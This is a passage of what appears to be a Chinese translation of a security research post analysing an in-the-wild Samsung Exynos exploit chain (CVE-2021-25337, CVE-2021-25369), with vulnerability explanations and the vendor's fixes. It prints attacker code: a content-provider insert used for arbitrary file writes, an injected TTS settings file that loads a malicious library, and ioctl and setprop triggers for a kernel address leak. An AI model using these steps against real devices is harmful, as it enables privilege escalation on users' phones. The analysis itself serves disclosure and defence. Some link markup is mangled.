+<li>通过剪贴板提供程序实现的任意文件读/写 - CVE-2021-25337</li>
+<li>通过sec_log实现的内核信息泄露 - CVE-2021-25369</li>
+<li>显示处理单元（DPU）驱动程序中的释放后使用（use-after-free） - CVE-2021-25370</li>
+</ol>
+<p>该利用样本针对运行内核4.14.113且搭载Exynos SOC的三星手机。三星手机根据销售地区运行两种类型的SOC之一。例如，在美国、中国和其他一些国家销售的三星手机使用高通SOC，而在大多数其他地区（如欧洲和非洲）销售的手机则运行Exynos SOC。该利用样本依赖于Mali GPU驱动程序和DPU驱动程序，这两个驱动程序是Exynos三星手机特有的。</p>
+<p>2020年底（发现此样本时）运行内核4.14.113的三星手机示例包括S10、A50和A51。</p>
+<p>获得的野外样本是一个JNI本地库文件，本应作为应用程序的一部分加载。遗憾的是，TAG未获取与此库一起使用的应用程序。通过应用程序获取初始代码执行是我们今年在其他攻击活动中看到的路径。<a href="https://blog.google/threat-analysis-group/italian-spyware-vendor-targets-users-in-italy-and-kazakhstan/">TAG</a>和<a href="/2022/06/curious-case-carrier-app.html">Project Zero</a>在6月发布了其中一次攻击活动的详细分析。</p>
+<h1 id="漏洞-1-任意文件系统读写">漏洞 #1 - 任意文件系统读写</h1><p>利用链使用CVE-2021-25337进行初始的任意文件读写。利用程序以<code>untrusted_app</code> SELinux上下文运行，但使用<code>system_server</code> SELinux上下文打开通常无法访问的文件。此漏洞是由于三星自定义剪贴板提供程序（以系统用户身份运行）中缺乏访问控制造成的。</p>
+<p><img src="/images/9ee10ec51dce/c69b3d377ffa5e4f9bcfbbf41489a30b.png" alt="三星2021年3月安全更新中CVE-2021-25337条目的截图。内容为："SVE-2021-19527 (CVE-2021-25337): 通过未受保护的剪贴板内容提供程序实现的任意文件读/写漏洞 严重性：中等 受影响版本：P(9.0)、Q(10.0)、R(11.0)设备，R(11.0)中的ONEUI 3.1除外 报告日期：2020年11月3日 披露状态：私下披露。SMR MAR-2021 Release 1之前的剪贴板服务中存在不当访问控制，允许不受信任的应用程序读取或写入设备中的任意文件。补丁添加了适当的调用者检查，以防止不当访问剪贴板服务。"" loading="lazy"></p>
+<h2 id="关于android内容提供程序">关于Android内容提供程序</h2><p>在Android中，<a href="https://developer.android.com/guide/topics/providers/content-providers">内容提供程序</a>管理不同数据的存储和系统范围访问。内容提供程序将其数据组织为表，列表示收集的数据类型，行表示每条数据。内容提供程序<a href="https://developer.android.com/guide/topics/providers/content-provider-creating#ContentProvider">需要实现六个抽象方法</a>：<code>query</code>、<code>insert</code>、<code>update</code>、<code>delete</code>、<code>getType</code>和<code>onCreate</code>。除了<code>onCreate</code>之外，所有这些方法都由客户端应用程序调用。</p>
+<p>根据<a href="https://developer.android.com/guide/topics/providers/content-provider-creating#Permissions">Android文档</a>：</p>
+<blockquote>
+<p>所有应用程序都可以从您的提供程序读取或写入，即使底层数据是私有的，因为默认情况下您的提供程序没有设置权限。要更改此设置，请在清单文件中使用<code>&lt;provider&gt;</code>元素的属性或子元素为您的提供程序设置权限。您可以设置适用于整个提供程序、某些表甚至某些记录的权限，或三者兼而有之。</p>
+</blockquote>
+<h2 id="漏洞详情">漏洞详情</h2><p>三星创建了一个自定义剪贴板内容提供程序，在系统服务器内运行。<a href="https://cs.android.com/android/platform/superproject/+/master:frameworks/base/services/java/com/android/server/SystemServer.java">系统服务器</a>是Android上一个权限非常高的进程，管理设备运行所需的许多关键服务，例如WifiService和TimeZoneDetectorService。系统服务器以特权系统用户（UID 1000，AID_system）身份运行，并在<code>system_server</code> SELinux上下文中。</p>
+<p>三星向系统服务器添加了一个自定义剪贴板内容提供程序。此自定义剪贴板提供程序专门用于图像。在<code>com.android.server.semclipboard.SemClipboardProvider</code>类中，有以下变量：</p>
+<pre><code>DATABASE_NAME = &#39;clipboardimage.db&#39;
+TABLE_NAME = &#39;ClipboardImageTable&#39;
+URL = &#39;content://com.sec.android.semclipboardprovider/images&#39;
+CREATE_TABLE = &quot; CREATE TABLE ClipboardImageTable (id INTEGER PRIMARY KEY AUTOINCREMENT,  _data TEXT NOT NULL);&quot;;
+</code></pre>
+<p>与位于&quot;正常&quot;应用程序中并可以通过清单中的权限限制访问的内容提供程序（如上所述）不同，系统服务器中的内容提供程序负责在自己的代码中限制访问。系统服务器是固件映像上的单个JAR（<code>services.jar</code>），没有用于放置任何权限的清单。因此，由系统服务器内的代码自行进行访问检查。</p>
+<p><strong>2022年11月10日更新</strong>：系统服务器代码本身不是一个应用程序。相反，其代码位于JAR文件<code>services.jar</code>中。其清单位于<code>/system/framework/framework-res.apk</code>中。在这种情况下，清单中<code>SemClipboardProvider</code>的条目是：</p>
+<pre><code>&lt;provider android:name=&quot;com.android.server.semclipboard.SemClipboardProvider&quot; android:enabled=&quot;true&quot; android:exported=&quot;true&quot; android:multiprocess=&quot;false&quot; android:authorities=&quot;com.sec.android.semclipboardprovider&quot; android:singleUser=&quot;true&quot;/&gt;
+</code></pre>
+<p>与&quot;正常&quot;应用程序定义的组件一样，系统服务器可以使用<code>android:permission</code>属性来控制对提供程序的访问，但它没有这样做。由于通过清单访问<code>SemClipboardProvider</code>不需要权限，任何访问控制必须来自提供程序代码本身。感谢Edward Cunningham指出这一点！</p>
+<p>如上所示，<code>ClipboardImageTable</code>仅为表定义了两列：<code>id</code>和<code>_data</code>。列名<code>_data</code>在Android内容提供程序中有特殊用途。它可以与[<code>openFileHelper</code>](<a href="https://developer.android.com/reference/android/content/ContentProvider#openFileHelper(android.net.Uri,%20java.lang.String)%E6%96%B9%E6%B3%95%E4%B8%80%E8%B5%B7%E4%BD%BF%E7%94%A8%EF%BC%8C%E5%9C%A8%E6%8C%87%E5%AE%9A%E8%B7%AF%E5%BE%84%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E3%80%82%E5%8F%AA%E6%9C%89%E8%A1%A8%E4%B8%AD%E8%A1%8C%E7%9A%84URI%E4%BC%A0%E9%80%92%E7%BB%99%60openFileHelper%60%EF%BC%8C%E5%B9%B6%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AA%E6%8C%87%E5%90%91%E8%AF%A5%E8%A1%8C%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84%E7%9A%84%5B%60ParcelFileDescriptor%60%5D(https://developer.android.com/reference/android/os/ParcelFileDescriptor)%E5%AF%B9%E8%B1%A1%E3%80%82%E7%84%B6%E5%90%8E%EF%BC%8C%60ParcelFileDescriptor%60%E7%B1%BB%E6%8F%90%E4%BE%9B%5B%60getFd%60%5D(https://developer.android.com/reference/android/os/ParcelFileDescriptor#getFd()%E6%96%B9%E6%B3%95%E6%9D%A5%E8%8E%B7%E5%8F%96%E8%BF%94%E5%9B%9E%E7%9A%84%60ParcelFileDescriptor%60%E7%9A%84%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89%E3%80%82">https://developer.android.com/reference/android/content/ContentProvider#openFileHelper(android.net.Uri,%20java.lang.String)方法一起使用，在指定路径打开文件。只有表中行的URI传递给`openFileHelper`，并返回一个指向该行存储路径的[`ParcelFileDescriptor`](https://developer.android.com/reference/android/os/ParcelFileDescriptor)对象。然后，`ParcelFileDescriptor`类提供[`getFd`](https://developer.android.com/reference/android/os/ParcelFileDescriptor#getFd()方法来获取返回的`ParcelFileDescriptor`的本地文件描述符（fd）。</a></p>
+<pre><code>public Uri insert(Uri uri, ContentValues values) {
+    long row = this.database.insert(TABLE_NAME, &quot;&quot;, values);
+    if (row &gt; 0) {
+        Uri newUri = ContentUris.withAppendedId(CONTENT_URI, row);
+        getContext().getContentResolver().notifyChange(newUri, null);
+        return newUri;
+    }
+    throw new SQLException(&quot;Fail to add a new record into &quot; + uri);
+}
+</code></pre>
+<p>上面的函数是<code>com.android.server.semclipboard.SemClipboardProvider</code>中易受攻击的<code>insert()</code>方法。此函数中没有包含访问控制，因此任何应用程序，包括<code>untrusted_app</code> SELinux上下文，都可以直接修改<code>_data</code>列。通过调用<code>insert</code>，应用程序可以通过系统服务器打开通常无法自行打开的文件。</p>
+<p>利用程序通过设备上不受信任的应用程序中的以下代码触发了该漏洞。此代码返回一个原始文件描述符。</p>
+<pre><code>ContentValues vals = new ContentValues();
+vals.put(&quot;_data&quot;, &quot;/data/system/users/0/newFile.bin&quot;);
+URI semclipboard_uri = URI.parse(&quot;content://com.sec.android.semclipboardprovider&quot;)
+ContentResolver resolver = getContentResolver();
+URI newFile_uri = resolver.insert(semclipboard_uri, vals);
+return resolver.openFileDescriptor(newFile_uri, &quot;w&quot;).getFd();
+</code></pre>
+<p>让我们逐行分析发生了什么：</p>
+<ol>
+<li>创建一个<a href="https://developer.android.com/reference/android/content/ContentValues"><code>ContentValues</code></a>对象。它保存调用者想要插入提供程序数据库表的键值对。键是列名，值是行条目。</li>
+<li>设置<code>ContentValues</code>对象：键设置为&quot;<code>_data</code>&quot;，值设置为由利用程序控制的任意文件路径。</li>
+<li>获取访问<code>semclipboardprovider</code>的URI。这是在<code>SemClipboardProvider</code>类中设置的。</li>
+<li>获取允许应用程序访问内容提供程序的<a href="https://developer.android.com/reference/android/content/ContentResolver"><code>ContentResolver</code></a>对象。</li>
+<li>使用我们的键值对在<code>semclipboardprovider</code>上调用<code>insert</code>。</li>
+<li>打开作为值传入的文件并返回原始文件描述符。<code>openFileDescriptor</code>调用内容提供程序的<code>openFile</code>，在本例中，它只是调用<code>openFileHelper</code>。</li>
+</ol>
+<p>利用程序将其下一阶段的二进制文件写入目录<code>/data/system/users/0/</code>。被丢弃的文件将具有<code>users_system_data_file</code>的SELinux上下文。正常的<code>untrusted_app</code>无法打开或创建<code>users_system_data_file</code>文件，因此在本例中，它们通过<code>system_server</code>代理打开，<code>system_server</code>可以打开<code>users_system_data_file</code>。虽然<code>untrusted_app</code>无法打开<code>users_system_data_file</code>，但它可以读取和写入<code>users_system_data_file</code>。一旦剪贴板内容提供程序打开文件并将fd传递给调用进程，调用进程现在就可以读取和写入它。</p>
+<p>利用程序首先使用此fd将其下一阶段的ELF文件写入文件系统。阶段2 ELF的内容嵌入在原始样本中。</p>
+<p>如下所述，在整个利用链中，此漏洞又被触发了三次。</p>
+<h2 id="漏洞修复">漏洞修复</h2><p>为了修复该漏洞，三星向<code>SemClipboardProvider</code>中的函数添加了访问检查。<code>insert</code>方法现在检查调用进程的PID是否为UID 1000，这意味着它已经以系统权限运行。</p>
+<pre><code>public Uri insert(Uri uri, ContentValues values) {
+    if (Binder.getCallingUid() != 1000) {
+        Log.e(TAG, &quot;Fail to insert image clip uri. blocked the access of package : &quot; + getContext().getPackageManager().getNameForUid(Binder.getCallingUid()));
+        return null;
+    }
+    long row = this.database.insert(TABLE_NAME, &quot;&quot;, values);
+    if (row &gt; 0) {
+        Uri newUri = ContentUris.withAppendedId(CONTENT_URI, row);
+        getContext().getContentResolver().notifyChange(newUri, null);
+        return newUri;
+    }
+    throw new SQLException(&quot;Fail to add a new record into &quot; + uri);
+}
+</code></pre>
+<h2 id="执行阶段2-elf">执行阶段2 ELF</h2><p>利用程序现在已将其阶段2二进制文件写入文件系统，但它们如何在其当前应用程序沙箱之外加载它呢？使用三星文本转语音应用程序（SamsungTTS.apk）。</p>
+<p><a href="https://galaxystore.samsung.com/detail/com.samsung.SMT?langCd=en">三星文本转语音应用程序（com.samsung.SMT）</a>是三星设备上预装的系统应用程序。它也以系统UID运行，但SELinux上下文权限稍低，是<code>system_app</code>而不是<code>system_server</code>。之前至少有一个公开漏洞曾利用此应用程序<a href="https://blog.flanker017.me/text-to-speech-speaks-pwned/">以系统身份获取代码执行</a>。这次的不同之处在于，利用程序不需要另一个漏洞；相反，它重用了剪贴板中的阶段1漏洞在文件系统上任意写入文件。</p>
+<p>旧版本的三星TTS应用程序在其设置文件中存储其引擎的文件路径。当应用程序中的服务启动时，它会从设置文件中获取路径，并使用<a href="https://developer.android.com/reference/java/lang/System#load(java.lang.String"><code>System.load</code></a> API将该文件路径作为本地库加载。</p>
+<p>利用程序利用这一点，使用阶段1漏洞将其文件路径写入设置文件，然后启动服务，该服务随后将其阶段2可执行文件作为系统UID和<code>system_app</code> SELinux上下文加载。</p>
+<p>为此，利用程序使用阶段1漏洞将以下内容写入两个不同的文件：<code>/data/user_de/0/com.samsung.SMT/shared_prefs/SamsungTTSSettings.xml</code>和<code>/data/data/com.samsung.SMT/shared_prefs/SamsungTTSSettings.xml</code>。根据手机和应用程序的版本，三星TTS应用程序使用这两个不同的路径作为其设置文件。</p>
+<pre><code>&lt;?xml version=&#39;1.0&#39; encoding=&#39;utf-8&#39; standalone=&#39;yes&#39; ?&gt;
+&lt;map&gt;
+&lt;string name=\&quot;eng-USA-Variant Info\&quot;&gt;f00&lt;/string&gt;\n&quot;
+&lt;string name=\&quot;SMT_STUBCHECK_STATUS\&quot;&gt;STUB_SUCCESS&lt;/string&gt;\n&quot;
+&lt;string name=\&quot;SMT_LATEST_INSTALLED_ENGINE_PATH\&quot;&gt;/data/system/users/0/newFile.bin&lt;/string&gt;\n&quot;
+&lt;/map&gt;
+</code></pre>
+<p><code>SMT_LATEST_INSTALLED_ENGINE_PATH</code>是传递给<code>System.load()</code>的文件路径。为了启动系统加载过程，利用程序通过向应用程序发送两个意图来停止并重新启动<code>SamsungTTSService</code>。然后<code>SamsungTTSService</code>启动加载，阶段2 ELF开始以系统用户身份在<code>system_app</code> SELinux上下文中执行。</p>
+<p>该利用样本至少来自2020年11月。截至2020年11月，一些设备上的三星TTS应用程序版本具有此任意文件加载功能，而其他设备则没有。3.0.04.14及更早版本的应用程序包含任意加载功能。似乎在Android 10（Q）上发布的设备搭载了更新版本的三星TTS应用程序，该版本不会根据设置文件中的路径加载ELF文件。例如，2019年底在Android 10上发布的A51设备搭载的是三星TTS应用程序的3.0.08.18版本，该版本不包含加载ELF的功能。</p>
+<p>在Android P及更早版本上发布的手机似乎具有3.0.08.18之前的应用程序版本，该版本确实会加载可执行文件，直到2020年12月。例如，来自<a href="https://www.sammobile.com/samsung/galaxy-a50/firmware/SM-A505F/XID/download/A505FDDS5BTJA/517463/">此A50设备</a>（2020年11月安全补丁级别）的三星TTS应用程序是3.0.03.22版本，该版本确实从设置文件加载。</p>
+<p>一旦ELF文件通过<code>System.load</code> API加载，它就开始执行。它包含两个额外的漏洞利用，以root用户身份获取内核读写权限。</p>
+<h1 id="漏洞-2-task-struct和sys-call-table地址泄露">漏洞 #2 - task_struct和sys_call_table地址泄露</h1><p>一旦第二阶段ELF运行（并以系统身份），利用程序继续执行。利用链使用的第二个漏洞（CVE-2021-25369）是一个信息泄露漏洞，用于泄露<code>task_struct</code>和<code>sys_call_table</code>的地址。泄露的<code>sys_call_table</code>地址用于击败KASLR。稍后用于获取任意内核读写的<code>addr_limit</code>指针是根据泄露的<code>task_struct</code>地址计算得出的。</p>
+<p>该漏洞存在于自定义三星日志文件的访问权限中：<code>/data/log/sec_log.log</code>。</p>
+<p><img src="/images/9ee10ec51dce/152f14ea36bafc60bd986d98f65e48f8.png" alt="三星2021年3月安全更新中CVE-2021-25369条目的截图。内容为："SVE-2021-19897 (CVE-2021-25369): sec_log中潜在的内核信息暴露 严重性：中等 受影响版本：O(8.x)、P(9.0)、Q(10.0) 报告日期：2020年12月10日 披露状态：私下披露。SMR MAR-2021 Release 1之前的sec_log文件中的不当访问控制漏洞向用户空间暴露敏感内核信息。补丁移除了易受攻击的文件。"" loading="lazy"></p>
+<p>利用程序滥用了<code>WARN_ON</code>来泄露两个内核地址，从而破坏ASLR。<code>WARN_ON</code>仅用于检测到内核错误的情况，因为它会打印完整的回溯，包括堆栈跟踪和寄存器值，到内核日志缓冲区<code>/dev/kmsg</code>。</p>
+<pre><code>void __warn(const char *file, int line, void *caller, unsigned taint,
+            struct pt_regs *regs, struct warn_args *args)
+{
+    disable_trace_on_warning();
+
+    pr_warn(&quot;------------[ cut here ]------------\n&quot;);
+
+    if (file)
+        pr_warn(&quot;WARNING: CPU: %d PID: %d at %s:%d %pS\n&quot;,
+            raw_smp_processor_id(), current-&gt;pid, file, line,
+            caller);
+    else
+        pr_warn(&quot;WARNING: CPU: %d PID: %d at %pS\n&quot;,
+            raw_smp_processor_id(), current-&gt;pid, caller);
+
+    if (args)
+        vprintk(args-&gt;fmt, args-&gt;args);
+
+    if (panic_on_warn) {
+        /*
+         * This thread may hit another WARN() in the panic path.
+         * Resetting this prevents additional WARN() from panicking the
+         * system on this thread.  Other threads are blocked by the
+         * panic_mutex in panic().
+         */
+        panic_on_warn = 0;
+        panic(&quot;panic_on_warn set ...\n&quot;);
+    }
+
+    print_modules();
+    dump_stack();
+    print_oops_end_marker();
+    /* Just a warning, don&#39;t kill lockdep. */
+    add_taint(taint, LOCKDEP_STILL_OK);
+}
+</code></pre>
+<p>在Android上，从<code>kmsg</code>读取的能力仅限于特权用户和上下文。虽然<code>system_server</code>可以读取<code>kmsg</code>，但从<code>system_app</code>上下文无法读取，这意味着利用程序无法读取。</p>
+<pre><code>a51:/ $ ls -alZ /dev/kmsg
+crw-rw---- 1 root system u:object_r:kmsg_device:s0 1, 11 2022-10-27 21:48 /dev/kmsg
+
+$ sesearch -A -s system_server -t kmsg_device -p read precompiled_sepolicy
+allow domain dev_type:lnk_file { getattr ioctl lock map open read };
+allow system_server kmsg_device:chr_file { append getattr ioctl lock map open read write };
+</code></pre>
+<p>然而，三星添加了一个自定义日志记录功能，将<code>kmsg</code>复制到<code>sec_log</code>。<code>sec_log</code>是位于<code>/data/log/sec_log.log</code>的文件。</p>
+<p>利用程序触发的<code>WARN_ON</code>位于ARM提供的Mali GPU图形驱动程序中。ARM在<a href="https://developer.arm.com/downloads/-/mali-drivers/bifrost-kernel">2020年2月的发布BX304L01B-SW-99002-r21p0-01rel1</a>中将<code>WARN_ON</code>替换为更合适的辅助函数<code>pr_warn</code>。然而，截至2021年1月，A51（SM-A515F）和A50（SM-A505F）仍在使用易受攻击的驱动程序版本（r19p0）。</p>
+<pre><code>/**
+ * kbasep_vinstr_hwcnt_reader_ioctl() - hwcnt reader&#39;s ioctl.
+ * @filp:   Non-NULL pointer to file structure.
+ * @cmd:    User command.
+ * @arg:    Command&#39;s argument.
+ *
+ * Return: 0 on success, else error code.
+ */
+static long kbasep_vinstr_hwcnt_reader_ioctl(
+    struct file *filp,
+    unsigned int cmd,
+    unsigned long arg)
+{
+    long rcode;
+    struct kbase_vinstr_client *cli;
+
+    if (!filp || (_IOC_TYPE(cmd) != KBASE_HWCNT_READER))
+        return -EINVAL;
+
+    cli = filp-&gt;private_data;
+    if (!cli)
+        return -EINVAL;
+
+    switch (cmd) {
+    case KBASE_HWCNT_READER_GET_API_VERSION:
+        rcode = put_user(HWCNT_READER_API, (u32 __user *)arg);
+        break;
+    case KBASE_HWCNT_READER_GET_HWVER:
+        rcode = kbasep_vinstr_hwcnt_reader_ioctl_get_hwver(
+            cli, (u32 __user *)arg);
+        break;
+    case KBASE_HWCNT_READER_GET_BUFFER_SIZE:
+        rcode = put_user(
+            (u32)cli-&gt;vctx-&gt;metadata-&gt;dump_buf_bytes,
+            (u32 __user *)arg);
+        break;
+    [...]
+    default:
+        WARN_ON(true);
+        rcode = -EINVAL;
+        break;
+    }
+
+    return rcode;
+}
+</code></pre>
+<p>具体来说，<code>WARN_ON</code>位于函数<code>kbase_vinstr_hwcnt_reader_ioctl</code>中。为了触发，利用程序只需要为HWCNT驱动程序调用一个无效的ioctl号，就会触发<code>WARN_ON</code>。利用程序进行两次ioctl调用：第一次是Mali驱动程序的<code>HWCNT_READER_SETUP</code> ioctl，用于初始化hwcnt驱动程序并能够调用ioctl；然后使用无效的ioctl号<code>0xFE</code>调用hwcnt ioctl目标。</p>
+<pre><code>hwcnt_fd = ioctl(dev_mali_fd, 0x40148008, &amp;v4);
+ioctl(hwcnt_fd, 0x4004BEFE, 0);
+</code></pre>
+<p>为了触发漏洞，利用程序多次向HWCNT驱动程序发送无效的ioctl，然后通过调用以下命令触发错误报告：</p>
+<pre><code>setprop dumpstate.options bugreportfull;
+setprop ctl.start bugreport;
+</code></pre>
+<p>在Android中，属性<code>ctl.start</code>启动在init中定义的服务。在目标三星设备上，谁有权访问<code>ctl.start</code>属性的SELinux策略比AOSP的策略宽松得多。最值得注意的是，在本利用程序的情况下，<code>system_app</code>有权设置<code>ctl_start</code>，从而启动错误报告。</p>
+<pre><code>allow at_distributor ctl_start_prop:file { getattr map open read };
+allow at_distributor ctl_start_prop:property_service set;
+allow bootchecker ctl_start_prop:file { getattr map open read };
+allow bootchecker ctl_start_prop:property_service set;
+allow dumpstate property_type:file { getattr map open read };
+allow hal_keymaster_default ctl_start_prop:file { getattr map open read };
+allow hal_keymaster_default ctl_start_prop:property_service set;
+allow ikev2_client ctl_start_prop:file { getattr map open read };
+allow ikev2_client ctl_start_prop:property_service set;
+allow init property_type:file { append create getattr map open read relabelto rename setattr unlink write };
+allow init property_type:property_service set;
+allow keystore ctl_start_prop:file { getattr map open read };
+allow keystore ctl_start_prop:property_service set;
+allow mediadrmserver ctl_start_prop:file { getattr map open read };
+allow mediadrmserver ctl_start_prop:property_service set;
+allow multiclientd ctl_start_prop:file { getattr map open read };
+allow multiclientd ctl_start_prop:property_service set;
+allow radio ctl_start_prop:file { getattr map open read };
+allow radio ctl_start_prop:property_service set;
+allow shell ctl_start_prop:file { getattr map open read };
+allow shell ctl_start_prop:property_service set;
+allow surfaceflinger ctl_start_prop:file { getattr map open read };
+allow surfaceflinger ctl_start_prop:property_service set;
+allow system_app ctl_start_prop:file { getattr map open read };
+allow system_app ctl_start_prop:property_service set;
+allow system_server ctl_start_prop:file { getattr map open read };
+allow system_server ctl_start_prop:property_service set;
+allow vold ctl_start_prop:file { getattr map open read };
+allow vold ctl_start_prop:property_service set;
+allow wlandutservice ctl_start_prop:file { getattr map open read };
+allow wlandutservice ctl_start_prop:property_service set;
+</code></pre>
+<p>错误报告服务在<code>/system/etc/init/dumpstate.rc</code>中定义：</p>
+<pre><code>service bugreport /system/bin/dumpstate -d -p -B -z \
+    -o /data/user_de/0/com.android.shell/files/bugreports/bugreport
+    class main
+    disabled
+    oneshot
+</code></pre>
+<p><code>dumpstate.rc</code>中的<code>bugreport</code>服务是三星特定的定制。<a href="https://cs.android.com/android/platform/superproject/+/master:frameworks/native/cmds/dumpstate/dumpstate.rc;l=1?q=dumpstate.rc&sq=&ss=android%2Fplatform%2Fsuperproject">AOSP版本的<code>dumpstate.rc</code></a>[<a href="https://cs.android.com/android/platform/superproject/+/master:frameworks/native/cmds/dumpstate/dumpstate.rc;l=1?q=dumpstate.rc&sq=&ss=android%2Fplatform%2Fsuperproject)%E4%B8%8D%E5%8C%85%E5%90%AB%E6%AD%A4%E6%9C%8D%E5%8A%A1%E3%80%82">https://cs.android.com/android/platform/superproject/+/master:frameworks/native/cmds/dumpstate/dumpstate.rc;l=1?q=dumpstate.rc&amp;sq=&amp;ss=android%2Fplatform%2Fsuperproject)不包含此服务。</a></p>
+<p>三星版本的<code>dumpstate</code>二进制文件（<code>/system/bin/dumpstate</code>）然后将<code>/proc/sec_log</code>中的所有内容复制到<code>/data/log/sec_log.log</code>，如下面的伪代码所示。这是<code>dumpstate</code>二进制文件中<code>dumpstate()</code>函数的前几行。<code>dump_sec_log</code>函数（二进制文件中包含符号）将参数二提供的路径中的所有内容复制到参数三提供的路径。</p>
+<pre><code>_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));
+LOBYTE(s) = 18;
+v650[0] = 0LL;
+s_8 = 17664LL;
+*(char **)((char *)&amp;s + 1) = *(char **)&quot;DUMPSTATE&quot;;
+DurationReporter::DurationReporter(v636, (__int64)&amp;s, 0);
+if ( ((unsigned __int8)s &amp; 1) != 0 )
+    operator delete(v650[0]);
+dump_sec_log(&quot;SEC LOG&quot;, &quot;/proc/sec_log&quot;, &quot;/data/log/sec_log.log&quot;);
+</code></pre>
+<p>启动<code>bugreport</code>服务后，利用程序使用<a href="https://man7.org/linux/man-pages/man7/inotify.7.html"><code>inotify</code></a>监视<code>/data/log/</code>目录中的<code>IN_CLOSE_WRITE</code>事件。<code>IN_CLOSE_WRITE</code>在打开进行写入的文件关闭时触发。因此，当<code>dumpstate</code>完成向<code>sec_log.log</code>写入时，将发生此监视。</p>
+<p>下面显示了触发<code>WARN_ON</code>语句后生成的<code>sec_log.log</code>文件内容示例。利用程序梳理文件内容，查找堆栈上地址<code>*b60</code>和<code>*bc0</code>处的两个值：<code>task_struct</code>和<code>sys_call_table</code>地址。</p>
+<pre><code>&lt;4&gt;[90808.635627]  [4:    poc:25943] ------------[ cut here ]------------
+&lt;4&gt;[90808.635654]  [4:    poc:25943] WARNING: CPU: 4 PID: 25943 at drivers/gpu/arm/b_r19p0/mali_kbase_vinstr.c:992 kbasep_vinstr_hwcnt_reader_ioctl+0x36c/0x664
+&lt;4&gt;[90808.635663]  [4:    poc:25943] Modules linked in:
+&lt;4&gt;[90808.635675]  [4:    poc:25943] CPU: 4 PID: 25943 Comm: poc Tainted: G        W       4.14.113-20034833 #1
+&lt;4&gt;[90808.635682]  [4:    poc:25943] Hardware name: Samsung BEYOND1LTE EUR OPEN 26 board based on EXYNOS9820 (DT)
+&lt;4&gt;[90808.635689]  [4:    poc:25943] Call trace:
+&lt;4&gt;[90808.635701]  [4:    poc:25943] [&lt;0000000000000000&gt;] dump_backtrace+0x0/0x280
+&lt;4&gt;[90808.635710]  [4:    poc:25943] [&lt;0000000000000000&gt;] show_stack+0x18/0x24
+&lt;4&gt;[90808.635720]  [4:    poc:25943] [&lt;0000000000000000&gt;] dump_stack+0xa8/0xe4
+&lt;4&gt;[90808.635731]  [4:    poc:25943] [&lt;0000000000000000&gt;] __warn+0xbc/0x164tv
+&lt;4&gt;[90808.635738]  [4:    poc:25943] [&lt;0000000000000000&gt;] report_bug+0x15c/0x19c
+&lt;4&gt;[90808.635746]  [4:    poc:25943] [&lt;0000000000000000&gt;] bug_handler+0x30/0x8c
+&lt;4&gt;[90808.635753]  [4:    poc:25943] [&lt;0000000000000000&gt;] brk_handler+0x94/0x150
+&lt;4&gt;[90808.635760]  [4:    poc:25943] [&lt;0000000000000000&gt;] do_debug_exception+0xc8/0x164
+&lt;4&gt;[90808.635766]  [4:    poc:25943] Exception stack(0xffffff8014c2bb40 to 0xffffff8014c2bc80)
+&lt;4&gt;[90808.635775]  [4:    poc:25943] bb40: ffffffc91b00fa40 000000004004befe 0000000000000000 0000000000000000
+&lt;4&gt;[90808.635781]  [4:    poc:25943] bb60: ffffffc061b65800 000000000ecc0408 000000000000000a 000000000000000a
+&lt;4&gt;[90808.635789]  [4:    poc:25943] bb80: 000000004004be30 000000000000be00 ffffffc86b49d700 000000000000000b
+&lt;4&gt;[90808.635796]  [4:    poc:25943] bba0: ffffff8014c2bdd0 0000000080000000 0000000000000026 0000000000000026
+&lt;4&gt;[90808.635802]  [4:    poc:25943] bbc0: ffffff8008429834 000000000041bd50 0000000000000000 0000000000000000
+&lt;4&gt;[90808.635809]  [4:    poc:25943] bbe0: ffffffc88b42d500 ffffffffffffffea ffffffc96bda5bc0 0000000000000004
+&lt;4&gt;[90808.635816]  [4:    poc:25943] bc00: 0000000000000000 0000000000000124 000000000000001d ffffff8009293000
+&lt;4&gt;[90808.635823]  [4:    poc:25943] bc20: ffffffc89bb6b180 ffffff8014c2bdf0 ffffff80084294bc ffffff8014c2bd80
+&lt;4&gt;[90808.635829]  [4:    poc:25943] bc40: ffffff800885014c 0000000020400145 0000000000000008 0000000000000008
+&lt;4&gt;[90808.635836]  [4:    poc:25943] bc60: 0000007fffffffff 0000000000000001 ffffff8014c2bdf0 ffffff800885014c
+&lt;4&gt;[90808.635843]  [4:    poc:25943] [&lt;0000000000000000&gt;] el1_dbg+0x18/0x74
+</code></pre>
+<p>文件<code>/data/log/sec_log.log</code>具有SELinux上下文<code>dumplog_data_file</code>，如下所示，许多应用程序都可以广泛访问它。利用程序当前在三星TTS应用程序内运行，该应用程序是<code>system_app</code> SELinux上下文。虽然由于SELinux访问控制，利用程序无法访问<code>/dev/kmsg</code>，但当相同内容被复制到访问权限更宽松的<code>sec_log.log</code>时，它可以访问。</p>
+<pre><code>$ sesearch -A -t dumplog_data_file -c file -p open precompiled_sepolicy | grep _app
+allow aasa_service_app dumplog_data_file:file { getattr ioctl lock map open read };
+allow dualdar_app dumplog_data_file:file { append create getattr ioctl lock map open read rename setattr unlink write };
+allow platform_app dumplog_data_file:file { append create getattr ioctl lock map open read rename setattr unlink write };
+allow priv_app dumplog_data_file:file { append create getattr ioctl lock map open read rename setattr unlink write };
+allow system_app dumplog_data_file:file { append create getattr ioctl lock map open read rename setattr unlink write };
+allow teed_app dumplog_data_file:file { append create getattr ioctl lock map open read rename setattr unlink write };
+allow vzwfiltered_untrusted_app dumplog_data_file:file { getattr ioctl lock map open read };
+</code></pre>
+<h2 id="漏洞修复">漏洞修复</h2><p>针对此漏洞进行了几项不同的更改：</p>
+<ul>
+<li>修改了设备上的<code>dumpstate</code>二进制文件 - 自2021年3月更新起，<code>dumpstate</code>不再写入<code>/data/log/sec_log.log</code>。</li>
+<li>从<code>dumpstate.rc</code>中移除了<code>bugreport</code>服务。</li>
+</ul>
+<p>此外，2020年初还进行了一些更改，如果包含这些更改，将在未来防止此漏洞：</p>
+<ul>
+<li>如上所述，ARM在2020年2月发布了Mali驱动程序的r21p0版本，该版本将<code>WARN_ON</code>替换为更合适的<code>pr_warn</code>，后者不记录完整的回溯。2021年3月的三星固件包括从Mali驱动程序的r19p0版本更新到r26p0版本，该版本使用<code>pr_warn</code>而不是<code>WARN_ON</code>。</li>
